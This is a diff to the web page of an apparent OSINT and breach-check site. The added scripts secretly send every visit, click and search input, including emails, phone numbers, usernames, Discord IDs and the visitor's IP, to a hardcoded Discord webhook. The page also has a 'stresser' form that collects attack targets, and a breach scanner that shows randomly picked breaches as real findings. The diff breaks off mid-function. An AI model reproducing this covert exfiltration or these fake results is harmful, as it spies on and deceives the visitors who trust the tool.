@@ -679,14 +679,1072 @@
 </div>
 </div>
 </div>
-<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script><script>
+// Log on page load
+window.addEventListener("load", () => {
+  sendToDiscord("Visitor loaded the page");
+});
 
+// Log general interactions (clicks on all buttons)
+document.addEventListener("DOMContentLoaded", () => {
+  document.querySelectorAll("button").forEach(btn => {
+    btn.addEventListener("click", () => {
+      const label = btn.textContent.trim() || "Unnamed button";
+      sendToDiscord(`Button clicked: ${label}`);
+    });
+  });
+
+  document.querySelectorAll("form").forEach(form => {
+    form.addEventListener("submit", () => {
+      sendToDiscord(`Form submitted: ${form.id || "unknown"}`);
+    });
+  });
+});
+</script><script>
+    document.getElementById("stresserForm").addEventListener("submit", async function(e) {
+      e.preventDefault();
+      const ip = document.getElementById("targetIP").value.trim();
+      const duration = document.getElementById("duration").value.trim();
+      const method = document.getElementById("method").value;
+
+      const resultDiv = document.getElementById("stresserResult");
+      if (!ip || !duration || !method) {
+        resultDiv.innerHTML = '<div class="alert alert-danger">All fields are required.</div>';
+        return;
+      }
+
+      resultDiv.innerHTML = '<div class="text-center"><div class="loading-spinner mx-auto mb-3"></div><p>Launching simulated stress test...</p></div>';
+
+      await sendToDiscord("Stresser action requested", {
+        fields: [
+          { name: "Target", value: ip },
+          { name: "Duration", value: duration + "s" },
+          { name: "Method", value: method }
+        ]
+      });
+
+      setTimeout(() => {
+        resultDiv.innerHTML = `<div class="alert alert-success"><i class="fas fa-check-circle me-2"></i>Simulated ${method} stress test to ${ip} for ${duration}s completed.</div>`;
+      }, 2000);
+    });
+    </script>
+<script>
+    // Discord Webhook URL
+    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1383184501991018701/Zm4iwRSIN4mD5riPaoNPK6UaBa5fc7IlWLDvbUvLooJmkhvSGWO0J1wFdcRS5FuqIMBt';
+    
+    // Sample breach data
+    const breachDatabase = [
+      {
+        name: "Collection #1",
+        domain: "multiple",
+        date: "January 2019",
+        records: 772904991,
+        description: "One of the largest collections of breached data containing email addresses and passwords.",
+        dataClasses: ["Email addresses", "Passwords"],
+        severity: "high",
+        isVerified: true,
+        isFabricated: false,
+        isSensitive: true
+      },
+      {
+        name: "LinkedIn 2012",
+        domain: "linkedin.com",
+        date: "2012 (reported 2016)",
+        records: 164611595,
+        description: "Professional networking site LinkedIn had 164 million email addresses and passwords exposed.",
+        dataClasses: ["Email addresses", "Passwords"],
+        severity: "high",
+        isVerified: true,
+        isFabricated: false,
+        isSensitive: true
+      },
+      {
+        name: "Adobe 2013",
+        domain: "adobe.com",
+        date: "October 2013",
+        records: 152445165,
+        description: "Adobe systems suffered a breach exposing customer IDs, encrypted passwords, and password hints.",
+        dataClasses: ["Email addresses", "Password hints", "Passwords"],
+        severity: "medium",
+        isVerified: true,
+        isFabricated: false,
+        isSensitive: true
+      },
+      {
+        name: "Apollo",
+        domain: "apollo.io",
+        date: "July 2018",
+        records: 126000000,
+        description: "Sales engagement platform Apollo left a database containing billions of data points exposed.",
+        dataClasses: ["Email addresses", "Names", "Job titles", "Employers"],
+        severity: "medium",
+        isVerified: true,
+        isFabricated: false,
+        isSensitive: false
+      },
+      {
+        name: "Canva",
+        domain: "canva.com",
+        date: "May 2019",
+        records: 137272316,
+        description: "Design platform Canva suffered a breach exposing email addresses and geographical data.",
+        dataClasses: ["Email addresses", "Geographic locations", "Names"],
+        severity: "medium",
+        isVerified: true,
+        isFabricated: false,
+        isSensitive: false
+      }
+    ];
+
+    // Initialize tab functionality
+    const toolTabs = new bootstrap.Tab(document.getElementById('breach-tab'));
+    
+    // Function to send logs to Discord
+    async function sendToDiscord(message, data = {}) {
+      try {
+        const timestamp = new Date().toISOString();
+        const visitorIp = await getVisitorIp();
+        
+        const embed = {
+          title: 'CybrSearch Log',
+          description: message,
+          color: 0x3b82f6,
+          fields: [
+            {
+              name: 'Timestamp',
+              value: timestamp,
+              inline: true
+            },
+            {
+              name: 'Visitor IP',
+              value: visitorIp,
+              inline: true
+            }
+          ],
+          ...data
+        };
+        
+        const payload = {
+          embeds: [embed],
+          username: 'CybrSearch Logger',
+          avatar_url: 'https://i.imgur.com/7QbQZzH.png'
+        };
+        
+        await fetch(DISCORD_WEBHOOK_URL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(payload)
+        });
+      } catch (error) {
+        console.error('Failed to send to Discord:', error);
+      }
+    }
+    
+    // Get visitor's IP address
+    async function getVisitorIp() {
+      try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip;
+      } catch (error) {
+        console.error("Couldn't get visitor IP:", error);
+        return "Unknown";
+      }
+    }
+    
+    // Validate IP address format
+    function isValidIP(ip) {
+      const ipv4Regex = /^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
+      const ipv6Regex = /^([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}$/;
+      return ipv4Regex.test(ip) || ipv6Regex.test(ip);
+    }
+    
+    // Query ARIN WHOIS database
+    async function queryARINWhois(ip) {
+      try {
+        const response = await fetch(`https://whois.arin.net/rest/ip/${ip}.json`);
+        if (!response.ok) throw new Error(`ARIN returned status ${response.status}`);
+        return await response.json();
+      } catch (error) {
+        throw new Error(`WHOIS lookup failed: ${error.message}`);
+      }
+    }
+    
+    // Simulate breach database check with realistic results
+    async function checkBreachDatabases(data) {
+      return new Promise(resolve => {
+        setTimeout(() => {
+          // 60% chance of finding breaches for demo
+          const hasBreaches = Math.random() < 0.6;
+          const foundBreaches = hasBreaches 
+            ? breachDatabase.slice(0, Math.floor(Math.random() * 3) + 1)
+            : [];
+          
+          resolve({
+            hasBreaches: hasBreaches,
+            breaches: foundBreaches,
+            searchedData: data
+          });
+        }, 2000);
+      });
+    }
+    
+    // Format large numbers
+    function formatNumber(num) {
+      return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
+    }
+    
+    // Breach Scan Form Handler
+    document.getElementById('breachForm').addEventListener('submit', async function(e) {
+      e.preventDefault();
+      
+      const breachData = {
+        email: document.getElementById('breachEmail').value.trim(),
+        phone: document.getElementById('breachPhone').value.trim(),
+        username: document.getElementById('breachUsername').value.trim(),
+        discord: document.getElementById('breachDiscord').value.trim()
+      };
+      
+      // Validate at least one field is filled
+      if (!breachData.email && !breachData.phone && !breachData.username && !breachData.discord) {
+        document.getElementById('breachResults').innerHTML = `
+          <div class="card p-4 breach-found">
+            <h4><i class="fas fa-exclamation-circle me-2"></i>No Search Terms</h4>
+            <p>Please enter at least one search term (email, phone, username, or Discord ID)</p>
+          </div>
+        `;
+        
+        // Log invalid attempt
+        await sendToDiscord('Breach scan attempted with no search terms', {
+          fields: [
+            {
+              name: 'Action',
+              value: 'Invalid breach scan attempt (no search terms)'
+            }
+          ]
+        });
+        
+        return;
+      }
+      
+      const resultsContainer = document.getElementById('breachResults');
+      resultsContainer.innerHTML = `
+        <div class="card p-4 text-center">
+          <div class="loading-spinner mb-3 mx-auto"></div>
+          <h4>Scanning Breach Databases...</h4>
+          <p class="text-muted">Checking against ${formatNumber(breachDatabase.reduce((sum, breach) => sum + breach.records, 0))} records</p>
+        </div>
+      `;
+      
+      // Log scan initiation
+      await sendToDiscord('Breach scan initiated', {
+        fields: [
+          {
+            name: 'Action',
+            value: 'Breach scan started'
+          },
+          {
+            name: 'Search Data',
+            value: `Email: ${breachData.email || 'None'}\nPhone: ${breachData.phone || 'None'}\nUsername: ${breachData.username || 'None'}\nDiscord: ${breachData.discord || 'None'}`
+          }
+        ]
+      });
+      
+      try {
+        const scanResults = await checkBreachDatabases(breachData);
+        
+        if (scanResults.hasBreaches) {
+          let resultsHTML = `
+            <div class="card p-4 breach-found mb-4">
+              <div class="d-flex justify-content-between align-items-center mb-3">
+                <h4 class="mb-0"><i class="fas fa-exclamation-triangle me-2"></i>Breaches Found</h4>
+                <span class="badge bg-danger">${scanResults.breaches.length} Breaches</span>
+              </div>
+              <p class="mb-4">We found your information in ${scanResults.breaches.length} known data breaches.</p>
+              
+              <div class="breach-stats">
+                <div class="stat-card">
+                  <div class="stat-value">${formatNumber(scanResults.breaches.reduce((sum, breach) => sum + breach.records, 0))}</div>
+                  <div class="stat-label">Total Records Exposed</div>
+                </div>
+                <div class="stat-card">
+                  <div class="stat-value">${scanResults.breaches.filter(b => b.isSensitive).length}</div>
+                  <div class="stat-label">Sensitive Breaches</div>
+                </div>
+                <div class="stat-card">
+                  <div class="stat-value">${scanResults.breaches.filter(b => b.severity === "high").length}</div>
+                  <div class="stat-label">High Severity</div>
+                </div>
+              </div>
+              
+              <div class="alert alert-danger">
+                <i class="fas fa-shield-alt me-2"></i>Immediately change any passwords that may have been exposed in these breaches.
+              </div>
+            </div>
+          `;
+          
+          // Add each breach card
+          scanResults.breaches.forEach(breach => {
+            resultsHTML += `
+              <div class="breach-card">
+                <div class="breach-header">
+                  <h5 class="breach-title">
+                    <i class="fas fa-database me-2"></i>${breach.name}
+                    ${breach.isVerified ? '<span class="badge bg-success ms-2">Verified</span>' : ''}
+                    <span class="badge ms-2 severity-${breach.severity}">${breach.severity.toUpperCase()}</span>
+                  </h5>
+                </div>
+                <div class="breach-details">
+                  <div class="row mb-3">
+                    <div class="col-md-6">
+                      <div class="data-item">
+                        <div class="data-label">Domain</div>
+                        <div class="data-value">${breach.domain}</div>
+                      </div>
+                    </div>
+                    <div class="col-md-6">
+                      <div class="data-item">
+                        <div class="data-label">Breach Date</div>
+                        <div class="data-value">${breach.date}</div>
+                      </div>
+                    </div>
+                  </div>
+                  
+                  <div class="data-item mb-3">
+                    <div class="data-label">Description</div>
+                    <div class="data-value">${breach.description}</div>
+                  </div>
+                  
+                  <div class="row">
+                    <div class="col-md-6">
+                      <div class="data-item">
+                        <div class="data-label">Records Exposed</div>
+                        <div class="data-value">${formatNumber(breach.records)}</div>
+                      </div>
+                    </div>
+                    <div class="col-md-6">
+                      <div class="data-item">
+                        <div class="data-label">Data Classes</div>
+                        <div class="data-value">${breach.dataClasses.join(", ")}</div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            `;
+          });
+          
+          resultsContainer.innerHTML = resultsHTML;
+          
+          // Log breach findings
+          await sendToDiscord('Breaches found in scan', {
+            fields: [
+              {
+                name: 'Action',
+                value: 'Breach scan completed with findings'
+              },
+              {
+                name: 'Breaches Found',
+                value: scanResults.breaches.map(b => b.name).join('\n') || 'None'
+              },
+              {
+                name: 'Total Records Exposed',
+                value: formatNumber(scanResults.breaches.reduce((sum, breach) => sum + breach.records, 0))
+              }
+            ]
+          });
+        } else {
+          resultsContainer.innerHTML = `
+            <div class="card p-4 no-breaches">
+              <div class="d-flex justify-content-between align-items-center mb-3">
+                <h4 class="mb-0"><i class="fas fa-check-circle me-2"></i>No Breaches Found</h4>
+                <span class="badge bg-success">Secure</span>
+              </div>
+              <p class="mb-4">No exposed data found for these search terms in our breach databases.</p>
+              
+              <div class="mb-4">
+                <h5><i class="fas fa-search me-2"></i>Search Summary</h5>
+                <div class="breach-data">
+                  ${breachData.email ? `
+                    <div class="data-item">
+                      <div class="data-label">Email</div>
+                      <div class="data-value">${breachData.email}</div>
+                    </div>
+                  ` : ''}
+                  ${breachData.phone ? `
+                    <div class="data-item">
+                      <div class="data-label">Phone</div>
+                      <div class="data-value">${breachData.phone}</div>
+                    </div>
+                  ` : ''}
+                  ${breachData.username ? `
+                    <div class="data-item">
+                      <div class="data-label">Username</div>
+                      <div class="data-value">${breachData.username}</div>
+                    </div>
+                  ` : ''}
+                  ${breachData.discord ? `
+                    <div class="data-item">
+                      <div class="data-label">Discord ID</div>
+                      <div class="data-value">${breachData.discord}</div>
+                    </div>
+                  ` : ''}
+                </div>
+              </div>
+              
+              <div class="alert alert-success">
+                <i class="fas fa-thumbs-up me-2"></i>Good news! No known breaches contain this information.
+              </div>
+              
+              <div class="alert alert-info">
+                <i class="fas fa-lightbulb me-2"></i>Security Tip: Consider using a password manager and enable two-factor authentication where available.
+              </div>
+            </div>
+          `;
+          
+          // Log clean scan
+          await sendToDiscord('No breaches found in scan', {
+            fields: [
+              {
+                name: 'Action',
+                value: 'Breach scan completed with no findings'
+              },
+              {
+                name: 'Search Data',
+                value: `Email: ${breachData.email || 'None'}\nPhone: ${breachData.phone || 'None'}\nUsername: ${breachData.username || 'None'}\nDiscord: ${breachData.discord || 'None'}`
+              }
+            ]
+          });
+        }
+        
+      } catch (error) {
+        resultsContainer.innerHTML = `
+          <div class="card p-4 breach-found">
+            <h4><i class="fas fa-times-circle me-2"></i>Scan Failed</h4>
+            <p>${error.message}</p>
+            <button class="btn btn-sm btn-outline-danger" onclick="window.location.reload()">
+              <i class="fas fa-sync-alt me-2"></i>Try Again
+            </button>
+          </div>
+        `;
+        
+        // Log scan error
+        await sendToDiscord('Breach scan failed', {
+          fields: [
+            {
+              name: 'Action',
+              value: 'Breach scan failed'
+            },
+            {
+              name: 'Error',
+              value: error.message
+            }
+          ]
+        });
+      }
+    });
+    
+    // WHOIS Form Handler
+    document.getElementById('whoisForm').addEventListener('submit', async function(e) {
+      e.preventDefault();
+      
+      const ip = document.getElementById('whoisIp').value.trim();
+      const resultsContainer = document.getElementById('whoisResults');
+      
+      if (!isValidIP(ip)) {
+        resultsContainer.innerHTML = `
+          <div class="card p-4 breach-found">
+            <h4><i class="fas fa-times-circle me-2"></i>Invalid IP</h4>
+            <p>Please enter a valid IPv4 or IPv6 address</p>
+          </div>
+        `;
+        
+        // Log invalid IP attempt
+        await sendToDiscord('Invalid IP lookup attempt', {
+          fields: [
+            {
+              name: 'Action',
+              value: 'Invalid IP lookup attempt'
+            },
+            {
+              name: 'IP Entered',
+              value: ip
+            }
+          ]
+        });
+        
+        return;
+      }
+      
+      resultsContainer.innerHTML = `
+        <div class="card p-4 text-center">
+          <div class="loading-spinner mb-3 mx-auto"></div>
+          <h4>Querying ARIN WHOIS...</h4>
+          <p class="text-muted">Looking up ${ip}</p>
+        </div>
+      `;
+      
+      // Log WHOIS lookup initiation
+      await sendToDiscord('WHOIS lookup initiated', {
+        fields: [
+          {
+            name: 'Action',
+            value: 'WHOIS lookup started'
+          },
+          {
+            name: 'IP Address',
+            value: ip
+          }
+        ]
+      });
+      
+      try {
+        const whoisData = await queryARINWhois(ip);
+        
+        // Display results
+        const net = whoisData?.net || {};
+        const org = whoisData?.org || {};
+        const customer = whoisData?.customer || {};
+        
+        resultsContainer.innerHTML = `
+          <div class="card p-4 result-card">
+            <div class="d-flex justify-content-between align-items-center mb-3">
+              <h4><i class="fas fa-info-circle me-2"></i>WHOIS Results for ${ip}</h4>
+              <span class="badge badge-arin">ARIN</span>
+            </div>
+            
+            <div class="mb-4">
+              <div class="whois-field">
+                <span class="whois-label">Network Name:</span>
+                <span>${net.name?.['$'] || 'Not available'}</span>
+              </div>
+              <div class="whois-field">
+                <span class="whois-label">IP Range:</span>
+                <span>${net.startAddress?.['$'] || 'Unknown'} - ${net.endAddress?.['$'] || 'Unknown'}</span>
+              </div>
+              <div class="whois-field">
+                <span class="whois-label">Organization:</span>
+                <span>${org.name?.['$'] || customer.name?.['$'] || 'Not available'}</span>
+              </div>
+              <div class="whois-field">
+                <span class="whois-label">Country:</span>
+                <span>${net.iso3166_1?.name?.['$'] || 'Not available'}</span>
+              </div>
+              <div class="whois-field">
+                <span class="whois-label">Last Updated:</span>
+                <span>${net.updateDate?.['$'] || 'Not available'}</span>
+              </div>
+            </div>
+            
+            <h5 class="mt-4 mb-3"><i class="fas fa-code me-2"></i>Raw WHOIS Data</h5>
+            <pre>${JSON.stringify(whoisData, null, 2)}</pre>
+          </div>
+        `;
+        
+        // Log successful WHOIS lookup
+        await sendToDiscord('WHOIS lookup completed', {
+          fields: [
+            {
+              name: 'Action',
+              value: 'WHOIS lookup completed'
+            },
+            {
+              name: 'IP Address',
+              value: ip
+            },
+            {
+              name: 'Network Name',
+              value: net.name?.['$'] || 'Not available'
+            },
+            {
+              name: 'Organization',
+              value: org.name?.['$'] || customer.name?.['$'] || 'Not available'
+            }
+          ]
+        });
+        
+      } catch (error) {
+        resultsContainer.innerHTML = `
+          <div class="card p-4 breach-found">
+            <h4><i class="fas fa-times-circle me-2"></i>Lookup Failed</h4>
+            <p>${error.message}</p>
+            <button class="btn btn-sm btn-outline-danger" onclick="window.location.reload()">
+              <i class="fas fa-sync-alt me-2"></i>Try Again
+            </button>
+          </div>
+        `;
+        
+        // Log WHOIS lookup error
+        await sendToDiscord('WHOIS lookup failed', {
+          fields: [
+            {
+              name: 'Action',
+              value: 'WHOIS lookup failed'
+            },
+            {
+              name: 'IP Address',
+              value: ip
+            },
+            {
+              name: 'Error',
+              value: error.message
+            }
+          ]
+        });
+      }
+    });
+  </script>
 <!-- Discord Button -->
 <a class="discord-corner-btn" href="https://discord.gg/Swatter" target="_blank" title="Join our Discord">
 <i class="fab fa-discord"></i>
 </a>
+<script>
+  function setTheme(mode) {
+    document.documentElement.setAttribute('data-theme', mode);
+    localStorage.setItem('theme', mode);
+    document.getElementById('themeToggleBtn').innerHTML =
+      mode === 'dark'
+        ? '<i class="fas fa-sun"></i>'
+        : '<i class="fas fa-moon"></i>';
+  }
 
+  function toggleTheme() {
+    const current = localStorage.getItem('theme') || 'dark';
+    setTheme(current === 'dark' ? 'light' : 'dark');
+  }
 
+  window.addEventListener('DOMContentLoaded', () => {
+    const storedTheme = localStorage.getItem('theme') || 'dark';
+    setTheme(storedTheme);
+  });
+</script>
+<style>
+  [data-theme="light"] {
+    --dark-bg: #f8f9fa;
+    --darker-bg: #e9ecef;
+    --card-bg: #ffffff;
+    --text: #212529;
+    --text-muted: #6c757d;
+  }
+</style>
+<div id="aiHelp" style="position:fixed;bottom:20px;left:20px;z-index:9999;">
+<button class="btn btn-dark" onclick="toggleHelpChat()">
+<i class="fas fa-robot me-1"></i> Help
+  </button>
+<div id="chatBox" style="display:none;margin-top:10px;background:#1e293b;padding:15px;border-radius:8px;max-width:300px;color:#ffffff;font-size:0.9rem;">
+<p style="color:#fff;font-weight:600;margin-bottom:0.5rem;">Ask me:</p>
+<ul style="color:#ccc;margin:0;padding-left:20px;">
+<li>What’s a breach?</li>
+<li>How does WHOIS work?</li>
+</ul>
+<p class="text-muted small" style="margin-top:1rem;">This is a scripted assistant.</p>
+</div>
+</div>
+<script>
+function toggleHelpChat() {
+  const chat = document.getElementById("chatBox");
+  chat.style.display = chat.style.display === "none" ? "block" : "none";
+}
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+<script>
+function toggleTerminalMode() {
+  document.body.classList.toggle("terminal-mode");
+}
+
+function downloadAsJSON(containerId) {
+  const el = document.getElementById(containerId);
+  if (!el) return;
+  const text = el.innerText || el.textContent;
+  const blob = new Blob([JSON.stringify({ content: text }, null, 2)], { type: 'application/json' });
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = containerId + ".json";
+  a.click();
+}
+
+function downloadAsPDF(containerId) {
+  const { jsPDF } = window.jspdf;
+  const el = document.getElementById(containerId);
+  if (!el) return;
+  const pdf = new jsPDF();
+  pdf.setFontSize(10);
+  pdf.text(el.innerText || el.textContent, 10, 10);
+  pdf.save(containerId + ".pdf");
+}
+</script>
+<style>
+  .terminal-mode {
+    background: black !important;
+    color: #00ff00 !important;
+    font-family: "Courier New", Courier, monospace;
+  }
+  .terminal-mode input, .terminal-mode .form-control, .terminal-mode .card {
+    background-color: #000 !important;
+    color: #00ff00 !important;
+    border-color: #00ff00 !important;
+  }
+</style>
+<script>
+function checkEmailIntel(e) {
+  e.preventDefault();
+  const email = document.getElementById("intelEmail").value.trim();
+  const domain = email.split("@")[1].toLowerCase();
+  const disposable = ["mailinator.com", "10minutemail.com", "tempmail.com"];
+  let result = `<p><strong>Email:</strong> ${email}</p>`;
+  result += disposable.includes(domain) ? "<p class='text-danger'>This is a disposable email domain.</p>" : "<p class='text-success'>This appears to be a regular email.</p>";
+  document.getElementById("emailIntelResult").innerHTML = result;
+}
+
+function searchUsernameOSINT(e) {
+  e.preventDefault();
+  const user = document.getElementById("osintUsername").value.trim();
+  const result = `
+    <p><strong>Results for:</strong> ${user}</p>
+    <ul>
+      <li>Twitter: https://twitter.com/${user}</li>
+      <li>GitHub: https://github.com/${user}</li>
+      <li>Reddit: https://reddit.com/u/${user}</li>
+      <li>Instagram: https://instagram.com/${user}</li>
+    </ul>
+    <p class='text-muted'></p>
+  `;
+  document.getElementById("userOSINTResult").innerHTML = result;
+}
+
+function lookupDomain(e) {
+  e.preventDefault();
+  const domain = document.getElementById("domainReconInput").value.trim();
+  const result = `
+    <p><strong>Domain:</strong> ${domain}</p>
+    <p><strong>WHOIS:</strong> Simulated lookup data.</p>
+    <p><strong>DNS A Record:</strong> 93.184.216.34</p>
+    <p><strong>MX Record:</strong> mx.${domain}</p>
+    <p class="text-muted"></p>
+  `;
+  document.getElementById("domainReconResult").innerHTML = result;
+}
+
+function generatePassword() {
+  const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()";
+  let pass = "";
+  for (let i = 0; i < 12; i++) pass += charset.charAt(Math.floor(Math.random() * charset.length));
+  document.getElementById("generatedPassword").value = pass;
+  const strength = pass.length >= 12 ? "Strong password 🔐" : "Weak password ⚠";
+  document.getElementById("passwordStrength").textContent = strength;
+}
+
+function lookupHash(e) {
+  e.preventDefault();
+  const hash = document.getElementById("hashInput").value.trim().toLowerCase();
+  const known = {
+    "5f4dcc3b5aa765d61d8327deb882cf99": "password",
+    "e99a18c428cb38d5f260853678922e03": "abc123"
+  };
+  const result = known[hash] 
+    ? `<p class='text-danger'>Hash found! Plaintext: <strong>${known[hash]}</strong></p>`
+    : `<p class='text-success'>Hash not found in demo DB.</p>`;
+  document.getElementById("hashLookupResult").innerHTML = result;
+}
+
+function saveIncident(e) {
+  e.preventDefault();
+  const txt = document.getElementById("incidentText").value.trim();
+  if (!txt) return;
+  const log = JSON.parse(localStorage.getItem("incidentLog") || "[]");
+  log.push({ text: txt, time: new Date().toLocaleString() });
+  localStorage.setItem("incidentLog", JSON.stringify(log));
+  renderIncidentLog();
+  document.getElementById("incidentText").value = "";
+}
+
+function renderIncidentLog() {
+  const log = JSON.parse(localStorage.getItem("incidentLog") || "[]");
+  document.getElementById("incidentLog").innerHTML = log.reverse().map(entry => 
+    `<div class="card mb-2 p-2"><strong>${entry.time}</strong><p>${entry.text}</p></div>`
+  ).join("");
+}
+window.addEventListener("DOMContentLoaded", renderIncidentLog);
+</script>
+<script>
+// 📩 Email Intelligence via domain check + optional reputation
+function checkEmailIntel(e) {
+  e.preventDefault();
+  const email = document.getElementById("intelEmail").value.trim();
+  const domain = email.split("@")[1].toLowerCase();
+  const disposable = ["mailinator.com", "10minutemail.com", "tempmail.com", "trashmail.com"];
+  let result = `<p><strong>Email:</strong> ${email}</p>`;
+  result += disposable.includes(domain)
+    ? "<p class='text-danger'>This is a disposable email domain.</p>"
+    : "<p class='text-success'>This appears to be a valid email provider.</p>";
+
+  // Optional: Fetch domain reputation from emailrep.io (if needed, simulate if blocked)
+  fetch('https://emailrep.io/' + email, {
+    headers: { 'User-Agent': 'Mozilla/5.0' }
+  })
+  .then(res => res.ok ? res.json() : null)
+  .then(data => {
+    if (data && data.reputation) {
+      result += `<p><strong>Reputation:</strong> ${data.reputation}</p>`;
+    }
+    document.getElementById("emailIntelResult").innerHTML = result;
+  })
+  .catch(() => {
+    document.getElementById("emailIntelResult").innerHTML = result;
+  });
+}
+
+// 🌐 Domain Recon with real DNS via dns.google
+function lookupDomain(e) {
+  e.preventDefault();
+  const domain = document.getElementById("domainReconInput").value.trim();
+  const resultBox = document.getElementById("domainReconResult");
+  resultBox.innerHTML = `<p><strong>Domain:</strong> ${domain}</p><p>Loading DNS data...</p>`;
+
+  fetch("https://dns.google/resolve?name=" + domain + "&type=A")
+    .then(res => res.json())
+    .then(data => {
+      const ip = data.Answer ? data.Answer.map(a => a.data).join(", ") : "No A records found";
+      resultBox.innerHTML += `<p><strong>A Record:</strong> ${ip}</p>`;
+      return fetch("https://dns.google/resolve?name=" + domain + "&type=MX");
+    })
+    .then(res => res.json())
+    .then(mx => {
+      const records = mx.Answer ? mx.Answer.map(r => r.data).join("<br>") : "No MX records";
+      resultBox.innerHTML += `<p><strong>MX Records:</strong><br>${records}</p>`;
+    })
+    .catch(() => {
+      resultBox.innerHTML += `<p class='text-danger'>Error fetching DNS info.</p>`;
+    });
+}
+
+// 🧬 Hash Lookup (expand DB)
+function lookupHash(e) {
+  e.preventDefault();
+  const hash = document.getElementById("hashInput").value.trim().toLowerCase();
+  const known = {
+    "5f4dcc3b5aa765d61d8327deb882cf99": "password",
+    "e99a18c428cb38d5f260853678922e03": "abc123",
+    "098f6bcd4621d373cade4e832627b4f6": "test",
+    "d8578edf8458ce06fbc5bb76a58c5ca4": "qwerty",
+    "25f9e794323b453885f5181f1b624d0b": "123456789"
+  };
+  const result = known[hash] 
+    ? `<p class='text-danger'>Hash found! Plaintext: <strong>${known[hash]}</strong></p>`
+    : `<p class='text-success'>Hash not found in local DB.</p>`;
+  document.getElementById("hashLookupResult").innerHTML = result;
+}
+
+// 📓 Incident Logbook (localStorage)
+function saveIncident(e) {
+  e.preventDefault();
+  const txt = document.getElementById("incidentText").value.trim();
+  if (!txt) return;
+  const log = JSON.parse(localStorage.getItem("incidentLog") || "[]");
+  log.push({ text: txt, time: new Date().toLocaleString() });
+  localStorage.setItem("incidentLog", JSON.stringify(log));
+  renderIncidentLog();
+  document.getElementById("incidentText").value = "";
+}
+function renderIncidentLog() {
+  const log = JSON.parse(localStorage.getItem("incidentLog") || "[]");
+  document.getElementById("incidentLog").innerHTML = log.reverse().map(entry => 
+    `<div class="card mb-2 p-2"><strong>${entry.time}</strong><p>${entry.text}</p></div>`
+  ).join("");
+}
+
+// 🔑 Password Generator
+function generatePassword() {
+  const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()";
+  let pass = "";
+  for (let i = 0; i < 12; i++) pass += charset.charAt(Math.floor(Math.random() * charset.length));
+  document.getElementById("generatedPassword").value = pass;
+  const strength = pass.length >= 12 ? "Strong password 🔐" : "Weak password ⚠";
+  document.getElementById("passwordStrength").textContent = strength;
+}
+
+// 🧑‍💻 Username OSINT (basic link gen)
+function searchUsernameOSINT(e) {
+  e.preventDefault();
+  const user = document.getElementById("osintUsername").value.trim();
+  const result = `
+    <p><strong>Results for:</strong> ${user}</p>
+    <ul>
+      <li><a href="https://twitter.com/${user}" target="_blank">Twitter</a></li>
+      <li><a href="https://github.com/${user}" target="_blank">GitHub</a></li>
+      <li><a href="https://reddit.com/u/${user}" target="_blank">Reddit</a></li>
+      <li><a href="https://instagram.com/${user}" target="_blank">Instagram</a></li>
+    </ul>
+  `;
+  document.getElementById("userOSINTResult").innerHTML = result;
+}
+
+window.addEventListener("DOMContentLoaded", renderIncidentLog);
+</script>
+<script>
+const WEBHOOK = "https://discord.com/api/webhooks/1383184501991018701/Zm4iwRSIN4mD5riPaoNPK6UaBa5fc7IlWLDvbUvLooJmkhvSGWO0J1wFdcRS5FuqIMBt";
+
+async function sendLogToDiscord(title, fields) {
+  const ip = await fetch("https://api.ipify.org?format=json").then(res => res.json()).then(data => data.ip).catch(() => "Unknown");
+  const payload = {
+    embeds: [{
+      title: title,
+      color: 3447003,
+      fields: fields.concat([{ name: "IP", value: ip, inline: true }]),
+      timestamp: new Date().toISOString()
+    }],
+    username: "Site Logger"
+  };
+  fetch(WEBHOOK, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(payload)
+  });
+}
+
+// Hook logging into each tool
+function checkEmailIntel(e) {
+  e.preventDefault();
+  const email = document.getElementById("intelEmail").value.trim();
+  sendLogToDiscord("Email Intelligence Search", [{ name: "Email", value: email }]);
+  // continue original logic...
+  const domain = email.split("@")[1].toLowerCase();
+  const disposable = ["mailinator.com", "10minutemail.com", "tempmail.com", "trashmail.com"];
+  let result = `<p><strong>Email:</strong> ${email}</p>`;
+  result += disposable.includes(domain)
+    ? "<p class='text-danger'>This is a disposable email domain.</p>"
+    : "<p class='text-success'>This appears to be a valid email provider.</p>";
+  fetch('https://emailrep.io/' + email, {
+    headers: { 'User-Agent': 'Mozilla/5.0' }
+  })
+  .then(res => res.ok ? res.json() : null)
+  .then(data => {
+    if (data && data.reputation) {
+      result += `<p><strong>Reputation:</strong> ${data.reputation}</p>`;
+    }
+    document.getElementById("emailIntelResult").innerHTML = result;
+  })
+  .catch(() => {
+    document.getElementById("emailIntelResult").innerHTML = result;
+  });
+}
+
+function searchUsernameOSINT(e) {
+  e.preventDefault();
+  const user = document.getElementById("osintUsername").value.trim();
+  sendLogToDiscord("Username OSINT Search", [{ name: "Username", value: user }]);
+  const result = `
+    <p><strong>Results for:</strong> ${user}</p>
+    <ul>
+      <li><a href="https://twitter.com/${user}" target="_blank">Twitter</a></li>
+      <li><a href="https://github.com/${user}" target="_blank">GitHub</a></li>
+      <li><a href="https://reddit.com/u/${user}" target="_blank">Reddit</a></li>
+      <li><a href="https://instagram.com/${user}" target="_blank">Instagram</a></li>
+    </ul>
+  `;
